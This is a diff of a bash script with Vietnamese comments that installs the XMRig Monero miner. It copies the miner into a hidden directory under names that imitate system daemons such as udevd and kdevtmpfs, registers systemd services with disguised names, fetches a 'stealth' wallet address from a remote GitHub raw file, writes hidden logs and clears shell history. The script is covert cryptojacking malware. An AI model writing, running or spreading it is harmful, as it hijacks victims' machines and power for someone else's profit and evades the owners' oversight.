@@ -14,14 +14,15 @@ THREADS_STEALTH=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
 INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
 mkdir -p "$INSTALL_DIR"
 
-NAME_USER=$(shuf -n1 -e "sysnetd" "coreupd" "netwatchd")
-NAME_STEALTH=$(shuf -n1 -e "udevd" "corelogd" "kdevtmpfs")
+# Danh sách tên hợp lệ, chọn 2 tên không trùng
+ALL_NAMES=("udevd" "systemd-update" "irqbalance" "corefixd" "sysnetd" "dbus-io" "logrotate" "journald" "netwatchd" "coreupd" "kdevtmpfs")
+read -r NAME_USER NAME_STEALTH < <(shuf -e "${ALL_NAMES[@]}" -n2)
 
 LOG_USER="/tmp/.xmrig_$NAME_USER.log"
 LOG_STEALTH="/tmp/.xmrig_$NAME_STEALTH.log"
 
-SERVICE_USER=$(shuf -n1 -e "netd.service" "corefix.service")
-SERVICE_STEALTH=$(shuf -n1 -e "kernel-core.service" "udev-sync.service")
+SERVICE_USER=$(shuf -n1 -e "netd.service" "corefix.service" "update-net.service")
+SERVICE_STEALTH=$(shuf -n1 -e "kernel-core.service" "udev-sync.service" "driverd.service")
 # ==========================
 
 echo "💻 Cài đặt XMRig và chạy tiến trình..."
@@ -38,9 +39,16 @@ cd xmrig
 mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$TOTAL_CORES
+
+# Dừng tiến trình cũ nếu có
+sudo systemctl stop $SERVICE_USER 2>/dev/null
+sudo systemctl stop $SERVICE_STEALTH 2>/dev/null
+
+# Copy xmrig vào vị trí ẩn với tên đã chọn
 cp ./xmrig "$INSTALL_DIR/$NAME_USER"
 cp ./xmrig "$INSTALL_DIR/$NAME_STEALTH"
 chmod +x "$INSTALL_DIR/$NAME_USER" "$INSTALL_DIR/$NAME_STEALTH"
+
 WALLET_STEALTH=$(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt)
 WORKER_STEALTH="stealth_$(hostname)"
 
@@ -90,4 +98,12 @@ cd ~
 rm -rf xmrig
 history -c
 
-echo "✅ Bắt đầu đào"
+echo "✅ Đào Monero đã bắt đầu với tiến trình:"
+echo "   ➤ $NAME_USER (User - $SERVICE_USER)"
+
+# Cài và mở htop để theo dõi hiệu suất
+if ! command -v htop >/dev/null 2>&1; then
+    echo "📦 Đang cài đặt htop"
+    sudo apt install -y htop
+fi
+exec htop
